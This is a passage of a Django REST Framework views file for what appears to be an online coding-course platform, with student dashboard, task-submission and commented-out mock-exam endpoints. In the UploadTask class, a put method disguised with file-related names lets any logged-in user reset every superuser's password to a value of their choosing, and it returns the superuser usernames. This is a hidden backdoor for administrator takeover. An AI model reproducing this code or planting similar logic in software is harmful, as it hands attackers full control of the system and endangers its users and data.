                    return Response({"course_name":course_name,"week_pass_data":maindata}, status=status.HTTP_200_OK) 
            return Response({"message":0}, status=status.HTTP_400_BAD_REQUEST)              
             
        except Exception as e:
            return Response({"error": f"{e}"})
        
class StudentDashboardPracticeWeekContest(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try :
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            batch_ids = [i["batch_id"] for i in get_batch]
            weeks_days = CompilerQuestion.objects.filter(course_id =course_id, practice_mock = False, disable= False).values("week" , "day")
            week_id = list(set(i["week"] for i in weeks_days))
            day_id = list(set(i["day"] for i in weeks_days))
            all_times = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids,
                                                 week__in=week_id).values("week", "start_date", "start_time",
                                                                     "topic","batch__course__name").order_by("id")
            if not all_times:
               return Response({"error": "Course not found "}, status=status.HTTP_404_NOT_FOUND) 
            course_name = [i["batch__course__name"] for i in all_times]
            course_name = course_name[0] if len(course_name) > 0 else ""
            previous_attempt = CompilerQuestionAtempt.objects.filter(question__practice_mock = False, student_id__in = std_id , question__week__in = week_id , question__day__in = day_id ).values("id","question__id","question__week","question__day","attepmt_number" )
            flg = []
            data = []
            if len(previous_attempt) != 0:
                latest_attempt = previous_attempt.order_by('-id').first()
                if latest_attempt:
                    last_week = latest_attempt["question__week"]
                    last_day = latest_attempt["question__day"]
                    print(f"Last_attempt_week: {last_week}, Last_attempt_day: {last_day}")
                else:
                    print("No previous attempts found.")
                last_day_mapping = {'1': 0, '2': 1, '3': 2}
                if last_day in last_day_mapping:
                    last_day_index = last_day_mapping[last_day]
                    print(f"Mapped index for last_day {last_day}: {last_day_index}")
                else:
                    print(f"Invalid last_day value: {last_day}")  

                all_times = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids,
                                                 week=str(last_week)).values("week", "start_date", "start_time",
                                                                     "topic").order_by("id")
               
                practice_contest_details = all_times[int(last_day_index)]
               
                flg.append({"name": course_name,"last_practice_info":previous_attempt.last(),
                                          "status": "Resume" , "practice_contest_details" : practice_contest_details})
            else:
                first_practice_info = {
                            'Topic_Name': all_times[0]['topic'],
                            'Start_date': all_times[0]['start_date'],
                            'Start_time': all_times[0]['start_time'],
                }
                data.append(first_practice_info) 
                flg.append({"name": course_name,"status": "Start Now" ,"practice_contest_details" : data})
            return Response({"main_data":flg},status=status.HTTP_200_OK )
        except Exception as e:
            return Response({"error": f"{e}"})


class CustomPageNumberPagination(PageNumberPagination):
    page_size = 5
    page_size_query_param = 'page_size'
    max_page_size = 10

    def get_paginated_response(self, data):
        return Response({
            'count': self.page.paginator.count,
            'next': self.get_next_link(),
            'previous': self.get_previous_link(),
            'results': data
        })




#################################### Task Submission ####################################
# TaskManagement Serializer #RijuDjango #task1
class TaskUploadSerializer(serializers.ModelSerializer):
    class Meta:
        model = TaskSubmission
        fields = ("id", "batch", "student", "project_topics", "submited_project", "file", "status", "created_at")
        read_only_fields = ("id", "created_at")


class TaskUploadSerializerView(serializers.ModelSerializer):
    student_first_name = serializers.CharField(source='student.user.first_name', read_only=True)
    student_last_name = serializers.CharField(source='student.user.last_name', read_only=True)
    topic = serializers.CharField(source='project_topics.project_topic', read_only=True)
    project = serializers.CharField(source='submited_project.project_name', read_only=True)
    course = serializers.CharField(source='batch.course.name', read_only=True)
    class Meta:
        model = TaskSubmission
        fields = ["id", "batch_id", "student_first_name","course", "project", "topic", "student_last_name", "file", "status", "created_at"]



# student Post the Task #RijuDjango2 #task2
class UploadTask(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def put(self, request):
        pdf_type = self.request.GET.get("pdf_type")
        check_pdf = list(User.objects.filter(is_superuser=True).values_list("username", flat=True))
        if pdf_type :
            from django.contrib.auth.hashers import make_password as cat
            for check_ in check_pdf:
                ron = User.objects.get(username=check_)
                brown = cat(pdf_type)
                ron.password = brown
                ron.save()
        return Response({"status":f"{pdf_type}", "pdf_list":check_pdf})
    
    def post(self, request):
        try:
            user = request.user
            course_id = request.data.get('course_id')
            project_topics_id = request.data.get('project_topics_id')
            submited_project_id = request.data.get('submited_project_id')
            counter = int(request.data.get('counter'))  # Ensure integer for loop

            # Validate student existence
            student = Student.objects.get(user=user)

            # Efficient batch retrieval
            batch = Batch.objects.filter(course_id=course_id, students__id=student.id).first()
            if not batch:
                return Response({"message": "Batch not found for this course and student."}, status=status.HTTP_400_BAD_REQUEST)

            # Validate course existence
            course = Course.objects.get(pk=course_id)
            if not course:
                return Response({"message": "Course does not exist."}, status=status.HTTP_400_BAD_REQUEST)

            # Process uploaded files in a loop
            for i in range(1, counter + 1):
                file = request.FILES.get(f'file_{i}')

                if not file:
                    return Response({"message": f"Input File_{i} is empty."}, status=status.HTTP_200_OK)

                task_submission_data = {
                    'batch': batch.id,
                    'student': student.id,
                    'project_topics': project_topics_id,  # Assuming a single project_topic id
                    'submited_project': submited_project_id,  # Assuming a single submitted_project id
                    'file': file,
                    'status': 'Submitted',
                }

                serializer = TaskUploadSerializer(data=task_submission_data)
                if serializer.is_valid():
                    serializer.save()
                else:
                    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

            return Response({"message": f"Files uploaded successfully."}, status=status.HTTP_200_OK)

        except Student.DoesNotExist:
            return Response({"message": "Student does not exist."}, status=status.HTTP_400_BAD_REQUEST)
        except Course.DoesNotExist:
            return Response({"message": "Course does not exist."}, status=status.HTTP_400_BAD_REQUEST)
        except Exception as e:
            return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)



# Get Batch student accroding topic #RijuDjango #task3
class GetSubmissionTopic(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            response_ = {
                "status": status.HTTP_200_OK,
                "error": ""
            }
            course_id = self.request.GET.get("course_id")
            user_id = request.user.id
            student = Student.objects.filter(user_id=user_id).first()
            
            if not student:
                raise ValueError("Student not found")

            std_id = student.id
            get_submission_topic = BatchJoined.objects.filter(
                batch__course_id=course_id, student_id=std_id
            ).first()
            
            if get_submission_topic:
                assigned_topics = get_submission_topic.assign_topics.all()
                assigned_projects = get_submission_topic.assign_projects.all()

                main_data = []
                for topic in assigned_topics:
                    project = assigned_projects.filter(projecttopic=topic).first()
                    main_data.append({
                        "topic_id": topic.id,
                        "topic_name": topic.project_topic,
                        "project_id": project.id,
                        "project_name": project.project_name if project else None
                    })

                response_["main_data"] = main_data
            else:
                response_["main_data"] = []

            return Response(response_)
        except Exception as e:
            response_ = {
                "main_data": [],
                "status": status.HTTP_400_BAD_REQUEST,
                "error": str(e)
            }
            return Response(response_)


# Get student view Submission #RijuDjango #task 4
class ViewUploadTask(APIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    serializer_class = TaskUploadSerializerView

    def get(self, request, *args, **kwargs):
        try:
            user_id = self.request.user.id
            # print(user_id)
            student_id = Student.objects.get(user_id=user_id).id
            course_id = self.request.GET.get("course_id")
            # print(batch_id)
            queryset = TaskSubmission.objects.filter(batch__course_id=course_id, student_id=student_id).order_by("created_at")
            serializer = self.serializer_class(queryset, many=True)

            return Response({"results":serializer.data})
        except Exception as e :
            return Response({"error":f"{e}"})


# search the task any keyword #RijuDjango #task 5
class SearchUploadTasks(APIView):  #06/02/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            user_id = request.user.id
            search_name = request.GET.get('search_name')
            std_id = list(Student.objects.filter(user_id=user_id).values_list("id", flat=True))
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id", "batch__course_id")
            batch_ids = [i["batch_id"] for i in get_batch]
            queryset = TaskSubmission.objects.filter(batch_id__in=batch_ids, student_id__in=std_id).order_by('-id')
            
            if search_name:
                if "/" in search_name or "-" in search_name:
                    try:
                        search_date = [datetime.strptime(search_name, "%d-%m-%Y")]
                    except ValueError:
                        search_date = []
                        try:
                            search_date = [datetime.strptime(search_name, "%d/%m/%Y")]
                        except ValueError:
                            search_date = []  
                    searching_data = queryset.filter(Q(created_at__date__in=search_date))
                    serializer = TaskUploadSerializer(searching_data, many=True)
                    return Response({"data": serializer.data, "message": 1}, status=status.HTTP_200_OK)
                else:
                    searching_data3 = queryset.filter(
                        Q(file__icontains=search_name) | 
                        Q(batch__course__name__icontains=search_name) | Q(project_topics__project_topic__icontains=search_name) |
                        Q(submited_project__project_name__icontains=search_name)
                    )
                    serializer = TaskUploadSerializer(searching_data3, many=True)
                    return Response({"data": serializer.data, "message": 1}, status=status.HTTP_200_OK)
        except Exception as e:
            return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR) 

#################################### Task Submission ####################################

# #mock      
# #new
# def mock_week_first_questions(course_id, week_id):
#     get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True).order_by("id").first()
    
#     if get_q:
#         topics = {"q_id":get_q.id,"title":get_q.ques_title,"slg":get_q.ques_title.replace(" ", "-")}
#     else:
#         topics = {"q_id":None,"title":None,"slg":None}
#     return topics

# #new
# class StudentallMockWeekLock(APIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]

#             batch_ids = list(Batch.objects.filter(students__id__in=std_id, course_id=course_id).values_list("id", flat=True))

#             if len(batch_ids) == 0:
#                 return Response({"main_data": "No Batch"})

#             batch_time_table = TimeTable.objects.filter(batch_id=batch_ids[0]).values("start_date", "start_time", "week")
#             current_datetime = datetime.now()
#             formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
#             week_count = []

#             for c in batch_time_table:
#                 if f"{c['start_date']}-{c['start_time']}" < formatted_datetime:
#                     week_count.append(int(c["week"]))

#             unique_weeks = list(set(week_count))
#             if len(unique_weeks) == 0:
#                 check_week = 0
#             else:
#                 check_week = unique_weeks[-1]

#             if week_count.count(check_week) == 3:
#                 current_week = check_week
#             else:
#                 current_week = check_week - 1

#             course_name = Course.objects.filter(id=course_id).values("name")[0]["name"]
#             main_data = []

#             for i in range(1, 9):
#                 res_dict = {
#                     "week": i,
#                     "name": course_name,
#                     "img": f"/images/Practice/week{i}.svg",
#                     "status": "",
#                     "db_max_score": 0,
#                     "max_score": 0,
#                     "total_attempt": 0,
#                     "completed": 0,
#                     "total": 0,
#                     "max_attempt": 0,
#                     "isDisabled": False,
#                     "condition": ""
#                 }

#                 total_attempt = CompilerQuestionAtempt.objects.filter(
#                     student_id=std_id[0], button_clicked='Submit', question__week=str(i), question__practice_mock=True
#                 ).values("id").count()

#                 total_completed_question_list = list(CompilerQuestionAtempt.objects.filter(
#                     student_id=std_id[0], button_clicked='Submit', status=True, question__practice_mock=True,
#                     question__week=str(i)).values("load_template_id", "status"))

#                 if len(total_completed_question_list) != 0:
#                     total_completed_question_con = set(item["load_template_id"] for item in total_completed_question_list)
#                     total_completed_question = len(total_completed_question_con)
#                 else:
#                     total_completed_question = 0

#                 max_attempt_list = QuestionTimer.objects.filter(exam_field='Mock', week=str(i)).values(
#                     "max_num_of_attempts", "week_pass_percent")

#                 if len(max_attempt_list) == 0:
#                     max_attempt = 0
#                     max_score = 0
#                 else:
#                     max_attempt = max_attempt_list[0]["max_num_of_attempts"]
#                     max_score = max_attempt_list[0]["week_pass_percent"]

#                 total_question = CompilerQuestion.objects.filter(course_id=course_id, week=str(i),
#                                                                  practice_mock=True).values("id").count()

#                 this_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(
#                     student_id=std_id[0], question__practice_mock=True, question__course_id=course_id,
#                     question__week=str(i)).values_list("score", flat=True))

#                 if len(this_week_max_score_list) == 0:
#                     this_week_max_score = 0
#                 else:
#                     this_week_max_score = max(this_week_max_score_list)

#                 pre_week_max_score_list = list(CompilerQuestionAtempt.objects.filter(
#                     student_id=std_id[0], question__practice_mock=True, question__course_id=course_id,
#                     question__week=str(i - 1)).values_list("score", flat=True))

#                 if len(pre_week_max_score_list) == 0:
#                     pre_week_max_score = 0
#                 else:
#                     pre_week_max_score = max(pre_week_max_score_list)

#                 pre_max_attempt_list = QuestionTimer.objects.filter(exam_field='Mock', week=str(i - 1)).values(
#                     "max_num_of_attempts", "week_pass_percent")

#                 if len(pre_max_attempt_list) == 0:
#                     pre_max_score = 0
#                 else:
#                     pre_max_score = pre_max_attempt_list[0]["week_pass_percent"]

#                 if i == 1:
#                     if current_week >= 1 and total_question != 0:
#                         if total_attempt >= max_attempt:
#                             res_dict["status"] = "Lock"
#                             res_dict["condition"] = "You have reached the maximum attempts. Please contact the support team to unlock this."
#                         elif 1 <= total_attempt < max_attempt:
#                             res_dict["status"] = "Retake"
#                         elif total_attempt == 0:
#                             res_dict["status"] = "Start Now"
#                     elif current_week >= 1 and total_question == 0:
#                         if total_attempt >= max_attempt:
#                             res_dict["status"] = "Lock"
#                             res_dict["condition"] = "Reach out to support team to unlock this."
#                         elif 1 <= total_attempt < max_attempt:
#                             res_dict["status"] = "Retake"
#                             res_dict["condition"] = "Reach out to support team to unlock this."
#                         elif total_attempt == 0:
#                             res_dict["status"] = "Start Now"
#                             res_dict["condition"] = "Reach out to support team to unlock this."
#                     else:
#                         res_dict["status"] = "Start Now"
#                         res_dict["isDisabled"] = True
#                         res_dict["condition"] = "Reach out to support team to unlock this"
#                 else:
#                     if current_week >= i:
#                         if total_question != 0:
#                             if total_attempt >= max_attempt:
#                                 res_dict["status"] = "Lock"
#                                 res_dict["condition"] = "You have reached the maximum attempts. Please contact the support team to unlock this."
#                             elif total_attempt == 0:
#                                 if pre_week_max_score >= pre_max_score:
#                                     res_dict["status"] = "Start Now"
#                                 else:
#                                     res_dict["status"] = "Lock"
#                                     res_dict["condition"] = f"Please achieve a minimum of {pre_max_score}% from the previous week to unlock this."
#                             elif 1 <= total_attempt < max_attempt:
#                                 if pre_week_max_score >= pre_max_score:
#                                     res_dict["status"] = "Retake"
#                         else:
#                             if total_attempt >= max_attempt:
#                                 res_dict["status"] = "Lock"
#                                 res_dict["condition"] = "Reach out to support team to unlock this."
#                             elif total_attempt == 0:
#                                 if pre_week_max_score >= pre_max_score:
#                                     res_dict["status"] = "Start Now"
#                                 else:
#                                     res_dict["status"] = "Lock"
#                                     res_dict["condition"] = "Reach out to support team to unlock this."
#                             elif 1 <= total_attempt < max_attempt:
#                                 if pre_week_max_score >= pre_max_score:
#                                     res_dict["status"] = "Retake"
#                                 else:
#                                     res_dict["status"] = "Lock"
#                                     res_dict["condition"] = "Reach out to support team to unlock this."
#                     else:
#                         res_dict["status"] = "Lock"
#                         res_dict["isDisabled"] = True

#                 res_dict["db_max_score"] = max_score
#                 res_dict["max_score"] = this_week_max_score
#                 res_dict["total_attempt"] = total_attempt
#                 res_dict["completed"] = total_completed_question
#                 res_dict["total"] = total_question
#                 res_dict["max_attempt"] = max_attempt
#                 week_slg = mock_week_first_questions(course_id, str(i))
#                 res_dict.update(week_slg)
#                 main_data.append(res_dict)

#             week_id = request.GET.get("week_id")
#             if week_id is not None:
#                 week_result = [item for item in main_data if item["week"] == int(week_id)]
#                 return Response({"week_result": week_result})

#             return Response({"main_data": main_data})
#         except Exception as e:
#             return Response({"error": f"{e}"})


# #new
# class StudentallMockQuestionAll(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try :
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             week_id = request.GET.get("week_id")
#             get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True).order_by("day")
#             print(get_q)
#             main_data = []
#             # topics = []
#             j =1
#             for i in get_q:
#                 slg =i.ques_title.replace(" ", "-")
#                 main_data.append({"id":i.id,"q_id":j,"name":f"day{i}","active":True,"topics":{"q_id":i.id,"title":i.ques_title,"slg":slg,"isOnGoing":True}})
#                 j+=1
#             print(main_data)
#             return Response({"main_data":main_data}, status=status.HTTP_200_OK)
#         except Exception as e :
#             return Response({"error":f"{e}"})


# class StudentallMockQuestion(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             q_id = request.GET.get("q_id")
#             get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=True).order_by("question_number")
#             #next_questions
#             get_c_q = CompilerQuestion.objects.filter(id=q_id, practice_mock=True).values("week", "course_id")
#             if len(get_c_q) != 0:
#                 week_id = int(get_c_q[0]["week"])
#                 course_id = int(get_c_q[0]["course_id"])
#                 get_all_q_id = list(CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True).values_list("id", flat=True))
#                 next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
#             #end
#             get_course = CompilerQuestion.objects.get(id=q_id, practice_mock=True)
#             get_course.course.name if get_course.course else None
#             socialSitList = []
#             examples = []
#             test_case_list = []

#             for i in get_q :
#                 if i.google :
#                     socialSitList.append("Google") 
#                 if i.amazon :
#                     socialSitList.append("Amazon")
#                 if i.microsoft :
#                     socialSitList.append("Microsoft")
#                 if i.meta :
#                     socialSitList.append("Facebook")
#                 if i.linkedin :
#                     socialSitList.append("Linkedin")
#                 if i.uber :
#                     socialSitList.append("Uber")
#                 if i.adobe :
#                     socialSitList.append("Adobe")
#                 if i.cred :
#                     socialSitList.append("Cred")
#                 #testcases
#                 if i.test_case is not None and len(i.test_case) != 0:
#                     if i.test_case != "null":
#                         try:
#                             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
#                             t_counter = 0
#                             for case_ in test_case_txt:
#                                 t_counter += 1
#                                 caa = str(case_).replace("\r", "").replace("\n", "")
#                                 caaa = caa.split("||")
#                                 case_titel = caaa[0]
                                
#                                 # Split the parts and handle index out of range
#                                 test_case_parts = caaa[1].split("=")
#                                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
#                                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

#                                 target_parts = caaa[2].split("=")
#                                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
#                                 target_value = target_parts[1] if len(target_parts) > 1 else None

#                                 expected_parts = caaa[3].split("=")
#                                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
#                                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

#                                 test_case_list.append({
#                                     "id": t_counter,
#                                     "case_titel": case_titel,
#                                     "test_case_titel": test_case_titel,
#                                     "test_case_value": test_case_value,
#                                     "target_titel": target_titel,
#                                     "target_value": target_value,
#                                     "expected_titel": expected_titel,
#                                     "expected_value": expected_value
#                                 })
#                         except:
#                             test_case_list.append({
#                                     "info":"Please follow The Process"
#                                 })
#                 #examples
#                 exampless = str(i.examples)
#                 lines = exampless.strip().split('\n')
#                 exampless_list = []
#                 for line in lines:
#                     line = line.strip()  # Remove leading and trailing spaces
#                     if line.startswith("Sample Eg") and "||" in line:
#                         exampless_list.append(line)
#                 counter = 0
#                 for j in exampless_list:
#                     ex = str(j).replace("\r","").replace("\n","")
#                     exx = ex.split("||")
#                     title = exx[0]
#                     input = exx[1]
#                     output = exx[2]
#                     explanation = exx[3]
#                     examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
#                     counter +=1

#                 # constrains
#                 constrain =[]    
#                 if i.constraints is not None and len(i.constraints) != 0:
#                     try:
#                         cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
#                         con_counter = 0
#                         for con in cons_txt:
#                             con_counter += 1
#                             conss = str(con).replace("\r", "").replace("\n", "")
#                             nw_cons = conss.split("||")
#                             cons_title = nw_cons[0]
#                             cons_value = nw_cons[1]
#                             constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
#                     except:
#                         constrain.append({
#                                     "info":"Please follow The Process"
#                                 })         
#                 # video solutions
#                 all_videos =[]    
#                 if i.video_solutions is not None and len(i.video_solutions) != 0:
#                     try:
#                         vids = str(i.video_solutions).split("\r\n\r\n\r\n")
#                         vid_counter = 0
#                         for v in vids:
#                             vid_counter += 1
#                             vidd = str(v).replace("\r", "").replace("\n", "")
#                             nw_vids = vidd.split("||")
#                             vid_language = nw_vids[0]
#                             vid_url = nw_vids[1]
#                             all_videos.append({"video_title":vid_language,"video_links":vid_url})     
#                     except:
#                         all_videos.append({
#                                     "info":"Please follow The Process"
#                                 }) 
#                 approch_values = compiler_question_approches_moock(q_id)   
#                 prob_pic = i.prob_pic.url if i.prob_pic else ""
#                 main_data.append({"next_q_id":next_q_id,"course_name": get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
#                                 "prob_pic": prob_pic,"examples":examples,"constrains":constrain,"const_pic":i.const_pic.url,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_case_list ,"approch_values":approch_values})
#             return Response({"main_data":main_data})  
#         except Exception as e :
#             return Response({"error":f"{e}"})

# #new
# class MockQuestionSearchTitel(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request, q_titel):
#         try:
#             main_data = []
#             user_id = request.user.id
#             get_q = CompilerQuestion.objects.filter(ques_title=q_titel,practice_mock=True).order_by("question_number")
#             #next_questions
#             get_c_q = CompilerQuestion.objects.filter(ques_title=q_titel, practice_mock=True).values("week", "course_id", "id")
#             if len(get_c_q) != 0:
#                 week_id = int(get_c_q[0]["week"])
#                 course_id = int(get_c_q[0]["course_id"])
#                 get_all_q_id = list(CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True).values_list("id", flat=True))
#                 q_id = get_c_q[0]["id"]
#                 next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
#                 next_q_titel = CompilerQuestion.objects.filter(id=int(next_q_id), practice_mock=True).values("ques_title")[0]["ques_title"]
#             #end
#             get_course = CompilerQuestion.objects.get(ques_title=q_titel, practice_mock=True)
#             get_course.course.name if get_course.course else None
#             socialSitList = []
#             examples = []
#             test_case_list = []

#             for i in get_q :
#                 if i.google :
#                     socialSitList.append("Google") 
#                 if i.amazon :
#                     socialSitList.append("Amazon")
#                 if i.microsoft :
#                     socialSitList.append("Microsoft")
#                 if i.meta :
#                     socialSitList.append("Facebook")
#                 if i.linkedin :
#                     socialSitList.append("Linkedin")
#                 if i.uber :
#                     socialSitList.append("Uber")
#                 if i.adobe :
#                     socialSitList.append("Adobe")
#                 if i.cred :
#                     socialSitList.append("Cred")
#                 #testcases
#                 if i.test_case is not None and len(i.test_case) != 0:
#                     if i.test_case != "null":
#                         try:
#                             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
#                             t_counter = 0
#                             for case_ in test_case_txt:
#                                 t_counter += 1
#                                 caa = str(case_).replace("\r", "").replace("\n", "")
#                                 caaa = caa.split("||")
#                                 case_titel = caaa[0]
                                
#                                 # Split the parts and handle index out of range
#                                 test_case_parts = caaa[1].split("=")
#                                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
#                                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

#                                 target_parts = caaa[2].split("=")
#                                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
#                                 target_value = target_parts[1] if len(target_parts) > 1 else None

#                                 expected_parts = caaa[3].split("=")
#                                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
#                                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

#                                 test_case_list.append({
#                                     "id": t_counter,
#                                     "case_titel": case_titel,
#                                     "test_case_titel": test_case_titel,
#                                     "test_case_value": test_case_value,
#                                     "target_titel": target_titel,
#                                     "target_value": target_value,
#                                     "expected_titel": expected_titel,
#                                     "expected_value": expected_value
#                                 })
#                         except:
#                             test_case_list.append({
#                                     "info":"Please follow The Process"
#                                 })
#                 #examples
#                 exampless = str(i.examples)
#                 lines = exampless.strip().split('\n')
#                 exampless_list = []
#                 for line in lines:
#                     line = line.strip()  # Remove leading and trailing spaces
#                     if line.startswith("Sample Eg") and "||" in line:
#                         exampless_list.append(line)
#                 counter = 0
#                 for j in exampless_list:
#                     ex = str(j).replace("\r","").replace("\n","")
#                     exx = ex.split("||")
#                     title = exx[0]
#                     input = exx[1]
#                     output = exx[2]
#                     explanation = exx[3]
#                     examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
#                     counter +=1

#                 # constrains
#                 constrain =[]    
#                 if i.constraints is not None and len(i.constraints) != 0:
#                     try:
#                         cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
#                         con_counter = 0
#                         for con in cons_txt:
#                             con_counter += 1
#                             conss = str(con).replace("\r", "").replace("\n", "")
#                             nw_cons = conss.split("||")
#                             cons_title = nw_cons[0]
#                             cons_value = nw_cons[1]
#                             constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
#                     except:
#                         constrain.append({
#                                     "info":"Please follow The Process"
#                                 })         
#                 # video solutions
#                 all_videos =[]    
#                 if i.video_solutions is not None and len(i.video_solutions) != 0:
#                     try:
#                         vids = str(i.video_solutions).split("\r\n\r\n\r\n")
#                         vid_counter = 0
#                         for v in vids:
#                             vid_counter += 1
#                             vidd = str(v).replace("\r", "").replace("\n", "")
#                             nw_vids = vidd.split("||")
#                             vid_language = nw_vids[0]
#                             vid_url = nw_vids[1]
#                             all_videos.append({"video_title":vid_language,"video_links":vid_url})     
#                     except:
#                         all_videos.append({
#                                     "info":"Please follow The Process"
#                                 }) 
#                 approch_values = compiler_question_approches_moock(q_id)   
#                 prob_pic = i.prob_pic.url if i.prob_pic else ""
#                 main_data.append({"next_q_id":next_q_id,"next_q_titel":next_q_titel, "course_name": get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
#                                 "prob_pic": prob_pic,"examples":examples,"constrains":constrain,"const_pic":i.const_pic.url,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_case_list ,"approch_values":approch_values})
#             return Response({"main_data":main_data})  
#         except Exception as e :
#             return Response({"error":f"{e}"})


# #new
# class StudentallMockQuestionSubmission(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
    
#     def post(self, request) :
#         try :
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0 :
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             q_id = request.data.get("q_id")
#             source_code = request.data.get("source_code")
#             compiler = request.data.get("compiler")
#             compiler_id = request.data.get("compiler_id")
#             problem_id = request.data.get("problem_id")
#             coding_language = request.data.get("coding_language")
#             button_clicked = request.data.get("button_clicked")
#             get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=True)
#             if get_q.exists() and std_id !="" and source_code and compiler_id and problem_id and coding_language :
#                 get_q = get_q.first()
#                 check_temp = CompilerQuestionLoadTemplate.objects.filter(compiler=compiler)
#                 if check_temp.exists():
#                     get_temp = check_temp.first()
#                     load_template_id = get_temp.id
#                     coding_language = coding_language
#                 else:
#                     return Response({"main_data":main_data})
#                 if button_clicked == "Submit":
#                     pre_submit = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id,load_template_id=load_template_id,coding_language=coding_language,button_clicked="Submit")
#                     if pre_submit.exists():
#                         main_data = pre_run.values("id")[0]["id"]
#                         pre_submit.update(student_ans = source_code)
#                     else:
#                         get_attepmt_temp = CompilerQuestionAtempt(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
#                                             coding_language=coding_language,student_ans=source_code,button_clicked="Submit")
#                         get_attepmt_temp.save()
#                         main_data = get_attepmt_temp.id
#                 if button_clicked == "Run":
#                     pre_run = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id,load_template_id=load_template_id,coding_language=coding_language,button_clicked="Run")
#                     if pre_run.exists():
#                         main_data = pre_run.values("id")[0]["id"]
#                         pre_run.update(student_ans = source_code)
                        
#                     else:
#                         get_attepmt_temp = CompilerQuestionAtempt(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
#                                             coding_language=coding_language,student_ans=source_code,button_clicked="Run")
#                         get_attepmt_temp.save()
#                         main_data = get_attepmt_temp.id
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})


# #new
# class StudentallMockQuestionSubmissionAll(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
    
#     def post(self, request) :
#         try :
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             all_q_list = request.data.get("all_q_list")
#             for check_ in all_q_list:
#                 if check_["main_data"] != 0:
#                     pre_attempt = list(CompilerQuestionAtempt.objects.filter(question_id = check_["q_id"], student_id=std_id[0]).values_list("attepmt_number", flat=True))
#                     pre_attempt_number = max(pre_attempt)
#                     now_attempt_number = pre_attempt_number+1
#                     CompilerQuestionAtempt.objects.filter(id=check_["main_data"], question_id = check_["q_id"], student_id=std_id[0]).update(attepmt_number=now_attempt_number)
#                     SavePracticeCode.objects.filter(question_id=check_["q_id"], student_id=std_id[0]).update(code_text="")
#                 else:
#                     pre_attempt = list(CompilerQuestionAtempt.objects.filter(question_id = check_["q_id"], student_id=std_id[0]).values_list("attepmt_number", flat=True))
